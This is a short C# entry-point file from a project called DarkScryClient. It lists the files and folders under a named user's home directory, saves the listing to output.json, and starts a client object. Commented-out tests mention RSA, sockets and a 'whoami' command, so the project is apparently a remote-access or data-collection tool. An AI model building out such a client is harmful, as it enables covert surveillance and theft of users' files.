using DarkScryClient.Client;
using DarkScryClient.Moduls.Collection;
using DarkScryClient.Moduls.Collection.Files;
using System.IO;
using System.Text.Json;


class Program
{

	static void Main()
	{
		var data = FilesExplorer.GetFilesAndDirectories(@"C:\Users\aharon");
		File.WriteAllText("output.json", data);
		// test_crypt.test_rsa();
		// socket_test.run_test();
		// test_command_manager.test_whoami();

		using (Client client = new Client())
		{
			client.Start();
		}
	}
}


